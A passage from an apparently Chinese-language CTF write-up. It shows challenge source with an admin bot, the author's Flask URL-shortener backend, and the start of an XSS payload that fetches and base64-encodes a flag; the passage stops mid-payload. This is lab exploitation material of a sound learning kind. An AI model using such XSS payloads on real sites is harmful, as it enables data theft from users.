<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;You are not authenticated&quot;</span>);</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/html/add-api.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/add-api&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">cookies</span>[<span class="string">&#x27;authenticated&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;You are not authenticated&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; url, javascript &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Test if the API works as expected</span></span><br><span class="line">    <span class="comment">// You can understand the GUSP protocol by reading thorugh those test cases</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> testCases = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="title function_">randInt</span>(<span class="number">15</span>, <span class="number">20</span>); ++i) &#123;</span><br><span class="line">        <span class="keyword">let</span> alias = <span class="title function_">randInt</span>(<span class="number">0</span>, <span class="number">3</span>) === <span class="number">0</span> ? <span class="title function_">randStr</span>(<span class="title function_">randInt</span>(<span class="number">3</span>, <span class="number">10</span>)) : <span class="literal">null</span>;</span><br><span class="line">        testCases.<span class="title function_">push</span>(&#123;</span><br><span class="line">            <span class="attr">original</span>: <span class="string">`https://<span class="subst">$&#123;randStr(randInt(<span class="number">3</span>, <span class="number">10</span>))&#125;</span>.<span class="subst">$&#123;randStr(randInt(<span class="number">10</span>, <span class="number">20</span>))&#125;</span>.com/<span class="subst">$&#123;randStr(randInt(<span class="number">0</span>, <span class="number">10</span>))&#125;</span>`</span>,</span><br><span class="line">            alias</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> result = <span class="title class_">Promise</span>.<span class="title function_">all</span>(</span><br><span class="line">        testCases.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; original, alias &#125;</span>) =&gt;</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> body = alias === <span class="literal">null</span> ?</span><br><span class="line">                <span class="string">`[gusp]URL|<span class="subst">$&#123;original.length&#125;</span>|<span class="subst">$&#123;original&#125;</span>[/gusp]`</span> :</span><br><span class="line">                <span class="string">`[gusp]URL|<span class="subst">$&#123;original.length&#125;</span>|<span class="subst">$&#123;original&#125;</span>|<span class="subst">$&#123;alias&#125;</span>[/gusp]`</span>;</span><br><span class="line"></span><br><span class="line">            <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/gusp&#x27;</span>, &#125;,</span><br><span class="line">                body</span><br><span class="line">            &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!res.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Content-Type&#x27;</span>).<span class="title function_">startsWith</span>(<span class="string">&#x27;application/gusp&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Should return Content-Type: application/gusp`</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">text</span>()</span><br><span class="line">            &#125;).<span class="title function_">then</span>(<span class="keyword">async</span> res =&gt; &#123;</span><br><span class="line">                <span class="keyword">const</span> [status, length, content] = res.<span class="title function_">match</span>(<span class="regexp">/\[gusp\]([^\[]+)\[\/gusp\]/</span>)[<span class="number">1</span>].<span class="title function_">split</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span> (+length !== content.<span class="property">length</span>) &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Length mismatch: <span class="subst">$&#123;length&#125;</span> vs <span class="subst">$&#123;content.length&#125;</span>`</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (content.<span class="title function_">match</span>(<span class="regexp">/[^A-Za-z0-9_-]/</span>)) &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Invalid alias format <span class="subst">$&#123;content&#125;</span>: should only contain A-Za-z0-9_-`</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (status !== <span class="string">&#x27;SUCCESS&#x27;</span>) &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Should return SUCCESS for non-duplicated alias`</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">const</span> testMode = <span class="title function_">randInt</span>(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">                <span class="keyword">if</span> (testMode &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="comment">// normal visit</span></span><br><span class="line">                    <span class="keyword">const</span> redirect = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(url + <span class="string">&#x27;/&#x27;</span> + content), &#123; <span class="attr">redirect</span>: <span class="string">&#x27;manual&#x27;</span> &#125;);</span><br><span class="line">                    <span class="keyword">if</span> (redirect.<span class="property">status</span> !== <span class="number">302</span>) &#123;</span><br><span class="line">                        <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Should redirect with status 302`</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">const</span> location = redirect.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Location&#x27;</span>).<span class="title function_">trim</span>();</span><br><span class="line">                    <span class="keyword">if</span> (location !== original) &#123;</span><br><span class="line">                        <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`<span class="subst">$&#123;content&#125;</span>: Should redirect to <span class="subst">$&#123;original&#125;</span>, but got <span class="subst">$&#123;location&#125;</span>`</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (testMode === <span class="number">3</span>) &#123;</span><br><span class="line">                    <span class="comment">// visit a non-exist alias</span></span><br><span class="line">                    <span class="keyword">const</span> redirect = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(url + <span class="string">&#x27;/&#x27;</span> + <span class="title function_">randStr</span>(<span class="title function_">randInt</span>(<span class="number">3</span>, <span class="number">10</span>))), &#123; <span class="attr">redirect</span>: <span class="string">&#x27;manual&#x27;</span> &#125;);</span><br><span class="line">                    <span class="keyword">if</span> (redirect.<span class="property">status</span> !== <span class="number">404</span>) &#123;</span><br><span class="line">                        <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Should return 404 for non-exist alias`</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (testMode === <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="comment">// create a duplicated alias</span></span><br><span class="line">                    <span class="keyword">const</span> body = <span class="string">`[gusp]URL|<span class="subst">$&#123;original.length&#125;</span>|<span class="subst">$&#123;original&#125;</span>|<span class="subst">$&#123;alias&#125;</span>[/gusp]`</span>;</span><br><span class="line">                    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">                        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                        <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/gusp&#x27;</span>, &#125;,</span><br><span class="line">                        body</span><br><span class="line">                    &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">text</span>());</span><br><span class="line">                    <span class="keyword">const</span> [status, _, __] = res.<span class="title function_">match</span>(<span class="regexp">/\[gusp\]([^\[]+)\[\/gusp\]/</span>)[<span class="number">1</span>].<span class="title function_">split</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (status !== <span class="string">&#x27;ERROR&#x27;</span>) &#123;</span><br><span class="line">                        <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Should return ERROR for duplicated alias`</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_">resolve</span>();</span><br><span class="line">            &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="title function_">reject</span>(err));</span><br><span class="line">        &#125;))</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    result.<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> id = uuid.<span class="title function_">v4</span>();</span><br><span class="line">        <span class="title class_">GUSPServices</span>.<span class="title function_">set</span>(id, &#123; url, javascript &#125;);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Your API is working! API ID is <span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Your API is not working: <span class="subst">$&#123;err.message&#125;</span>`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// admin bot part</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">id, alias</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/<span class="subst">$&#123;id&#125;</span>/<span class="subst">$&#123;alias&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Visiting <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>()</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>()</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`[+] error visting <span class="subst">$&#123;path&#125;</span>`</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    <span class="keyword">await</span> context.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;/report&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;id&quot; placeholder=&quot;API ID&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;alias&quot; placeholder=&quot;Alias&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;submit&quot; value=&quot;Report&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    `</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// make the bot visit the GUSP service with the given id and alias</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; id, alias &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">GUSPServices</span>.<span class="title function_">has</span>(id)) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;API not found&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alias.<span class="title function_">match</span>(<span class="regexp">/[^A-Za-z0-9_-]/</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Invalid alias&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">visit</span>(id, alias);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Admin will check your report&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Listening on port 3000&#x27;</span>);</span><br><span class="line">    browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">pipe</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">dumpio</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">&#x27;--js-flags=--jitless,--no-expose-wasm&#x27;</span>, <span class="string">&#x27;--disable-gpu&#x27;</span>, <span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>, <span class="string">&#x27;--no-sandbox&#x27;</span>],</span><br><span class="line">        <span class="attr">headless</span>: <span class="string">&#x27;new&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>根據上面的架構可以知道我會需要寫一個後端，我這邊是用 python flask 來寫的後端，主要就是處理網址等等的訊息，讓他符合網頁上所述之規範即可，經過多次修改與嘗試我的 <code>server.py</code> code 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, Response</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> CORS</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">CORS(app)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dictionary to store the mapping of shortened URLs to original URLs</span></span><br><span class="line">url_mapping = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_original</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shorten_url</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;POST~~~&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse the Content-Type and content of the request</span></span><br><span class="line">        content_type = request.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> content_type != <span class="string">&#x27;application/gusp&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid Content-Type&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        request_data = request.data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;request_data:&quot;</span>, request_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Use regular expressions to extract URL, URL length, and shortened ID</span></span><br><span class="line">        <span class="comment"># match = re.match(r&#x27;\[gusp\]URL\|(\d+)\|(.+)(\|(.+))?\[/gusp\]&#x27;, request_data)</span></span><br><span class="line">        <span class="comment"># match = re.match(r&#x27;\[gusp\]URL\|(\d+)\|(.+)(\|(.+))?\[/gusp\]&#x27;, request_data)</span></span><br><span class="line"></span><br><span class="line">        request_data = request_data.replace(<span class="string">&quot;[gusp]&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;[/gusp]&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        tmp_data = request_data.split(<span class="string">&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># if not match:</span></span><br><span class="line">        <span class="comment">#     # return &quot;Invalid request format&quot;, 400</span></span><br><span class="line">        <span class="comment">#     description = &quot;Error_whatever_hahaha&quot;</span></span><br><span class="line">        <span class="comment">#     response_data = Response(f&quot;[gusp]ERROR|&#123;len(description)&#125;|&#123;description&#125;[/gusp]&quot;)</span></span><br><span class="line">        <span class="comment">#     response_data.content_type = &#x27;application/gusp&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     print(&quot;not match, Response:&quot;)</span></span><br><span class="line">        <span class="comment">#     print(&quot;Status Code:&quot;, response_data.status_code)</span></span><br><span class="line">        <span class="comment">#     print(&quot;Content-Type:&quot;, response_data.content_type)</span></span><br><span class="line">        <span class="comment">#     print(&quot;Data:&quot;, response_data.data)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     return response_data</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># url_length = int(match.group(1))</span></span><br><span class="line">        <span class="comment"># original_url = match.group(2)</span></span><br><span class="line">        <span class="comment"># shortened_id = match.group(3)</span></span><br><span class="line"></span><br><span class="line">        url_length = <span class="string">&quot;&quot;</span></span><br><span class="line">        original_url = <span class="string">&quot;&quot;</span></span><br><span class="line">        shortened_id = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp_data)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">                url_length = tmp_data[i]</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">                original_url = tmp_data[i]</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">                shortened_id = tmp_data[i]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;url_length:&quot;</span>, url_length)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;original_url:&quot;</span>, original_url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;shortened_id:&quot;</span>, shortened_id)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Create a shortened ID (if not provided)</span></span><br><span class="line">        <span class="keyword">if</span> shortened_id == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            shortened_id = generate_shortened_id()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> url_mapping.keys():</span><br><span class="line">            <span class="keyword">if</span> x == shortened_id:</span><br><span class="line">                des = <span class="string">&quot;error_whatever&quot;</span></span><br><span class="line">                response_data = Response(<span class="string">f&quot;[gusp]ERROR|<span class="subst">&#123;<span class="built_in">len</span>(des)&#125;</span>|<span class="subst">&#123;des&#125;</span>[/gusp]&quot;</span>)</span><br><span class="line">                response_data.content_type = <span class="string">&#x27;application/gusp&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> response_data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Store the mapping of shortened URL to original URL</span></span><br><span class="line">        url_mapping[shortened_id] = original_url</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Build a success response</span></span><br><span class="line">        response_data = Response(<span class="string">f&quot;[gusp]SUCCESS|<span class="subst">&#123;<span class="built_in">len</span>(shortened_id)&#125;</span>|<span class="subst">&#123;shortened_id&#125;</span>[/gusp]&quot;</span>)</span><br><span class="line">        response_data.content_type = <span class="string">&#x27;application/gusp&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Response Data:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Status Code:&quot;</span>, response_data.status_code)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Content-Type:&quot;</span>, response_data.content_type)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Data:&quot;</span>, response_data.data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> response_data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;shortened_id&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shortened_url</span>(<span class="params">shortened_id</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;GET~~~&quot;</span>)</span><br><span class="line">        <span class="comment"># Check if a mapping exists for the shortened ID</span></span><br><span class="line">        <span class="keyword">if</span> shortened_id <span class="keyword">not</span> <span class="keyword">in</span> url_mapping:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Shortened URL not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Retrieve the original URL and redirect</span></span><br><span class="line">        original_url = url_mapping[shortened_id]</span><br><span class="line">        <span class="keyword">return</span> redirect(original_url, code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_shortened_id</span>():</span><br><span class="line">    characters = string.ascii_letters + string.digits</span><br><span class="line">    random_string = <span class="string">&quot;abc123&quot;</span></span><br><span class="line">    <span class="keyword">while</span> random_string <span class="keyword">in</span> url_mapping:</span><br><span class="line">        random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;generate random string:&quot;</span>, random_string)</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>這邊先放一下我的 XSS code ，這是因為以知可以塞進任意 javascript code ：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URL to visit</span></span><br><span class="line"><span class="keyword">const</span> targetURL = <span class="string">&#x27;http://127.0.0.1/flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Headers for the initial request</span></span><br><span class="line"><span class="keyword">const</span> headers = &#123;</span><br><span class="line">  <span class="string">&#x27;give-me-the-flag&#x27;</span>: <span class="string">&#x27;yes&#x27;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send the initial request to targetURL with custom headers</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>, &#123; headers &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="comment">// If the response is successful, read its content as     text</span></span><br><span class="line">      <span class="keyword">return</span> response.<span class="title function_">text</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Failed to fetch the flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">flagContent</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Encode the flag content as base64</span></span><br><span class="line">    <span class="keyword">const</span> base64Flag = <span class="title function_">btoa</span>(flagContent);</span><br><span class="line"></span><br><span class="line">    <span 